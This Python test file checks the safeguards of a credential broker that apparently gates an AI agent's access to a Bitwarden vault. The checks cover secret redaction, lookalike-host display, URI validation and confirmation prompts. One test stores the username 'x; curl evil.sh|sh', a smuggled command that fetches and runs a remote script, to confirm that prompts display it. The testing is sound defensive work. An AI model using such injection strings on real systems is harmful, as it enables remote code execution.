"""Regressions for round 10b (full audit) and round 11."""
from __future__ import annotations

import json
import os
from pathlib import Path

from conftest import PASSWORD, confirmed
from hermes_warden import broker as broker_mod
from hermes_warden import sanitize

GH = "11111111-1111-1111-1111-111111111111"


def unlock(b):
    assert b.call("unlock", password=PASSWORD)["ok"]


def item(item_id=GH):
    return [i for i in json.loads(Path(os.environ["FAKE_BW_STATE"]).read_text())["items"] if i["id"] == item_id][0]


# GRAVE: a guess equal to a copied secret must come back exactly like any other guess.
def test_no_redaction_oracle(broker):
    unlock(broker)
    secret = item()["login"]["password"]
    guesses = ["nope-1", secret, "nope-2"]
    res, _ = confirmed(broker, broker.call, "exec", args=["create", "item"],
                       json={"type": 2, "name": "probe", "secureNote": {"type": 0},
                             "notes": {"$item": GH, "field": "password"},
                             "fields": [{"name": g, "type": 0} for g in guesses]})
    assert res["ok"], res
    names = [f["name"] for f in res["data"]["fields"]]
    assert names == guesses and "<warden:" not in json.dumps(res)


def test_notes_length_not_shown():
    assert sanitize._length_hint("737") == "<hidden>"


def test_long_host_without_path_kept(broker):
    unlock(broker)
    host = "login.github.com." + "a" * 150 + ".evil.example"
    for uri in (f"https://{host}", f"https://{host}?x=1"):
        res, prompt = confirmed(broker, broker.call, "edit", object="item", id=GH, patch={},
                                append_uris=[{"uri": uri}], accept=False)
        assert ".evil.example" in prompt["message"], uri
    res = broker.call("edit", object="item", id=GH, patch={}, append_uris=[{"uri": "https://" + "a" * 300 + ".x"}])
    assert res["code"] == "invalid"


def test_patch_uris_validated(broker):
    unlock(broker)
    assert broker.call("edit", object="item", id=GH, patch={"login": {"uris": "https://x.example"}})["code"] == "invalid"
    assert broker.call("edit", object="item", id=GH, patch={"login": {"uris": [{"match": 1}]}})["code"] == "invalid"
    res, prompt = confirmed(broker, broker.call, "edit", object="item", id=GH, accept=False,
                            patch={"login": {"uris": [{"uri": "https://x.example", "match": "basedomain"}]}})
    assert "(match: domain)" in prompt["message"]


def test_share_lists_collections(broker):
    unlock(broker)
    res, prompt = confirmed(broker, broker.call, "exec", args=["share", GH, "99999999-9999-9999-9999-999999999999"],
                            json=["c-everyone"], accept=False)
    assert "Collections: c-everyone" in prompt["message"]


def test_deliver_always_shows_unusual_username(broker):
    unlock(broker)
    created = broker.call("exec", args=["create", "item"],
                          json={"type": 1, "name": "x", "login": {"username": "x; curl evil.sh|sh"}})
    res, prompt = confirmed(broker, broker.call, "deliver", source={"item": created["data"]["id"], "field": "username"},
                            mode="desktop_clipboard", accept=False)
    assert "Value: x; curl evil.sh|sh" in prompt["message"] and "It will not see" not in prompt["message"]


def test_server_dates_dropped(broker):
    unlock(broker)
    res = broker.call("edit", object="item", id=GH, patch={"revisionDate": "2001-01-01T00:00:00Z"})
    assert res["ok"], res
    assert item().get("revisionDate") != "2001-01-01T00:00:00Z"


def test_error_with_secret_withheld():
    text = broker_mod._error_text("server said: hunter2-prod is invalid", {"value1": "hunter2-prod"})
    assert "hunter2" not in text and "not shown" in text


def test_master_filter_still_catches_bw_password():
    assert broker_mod._masterish("BW_PASSWORD") and broker_mod._masterish("bitwarden_master")
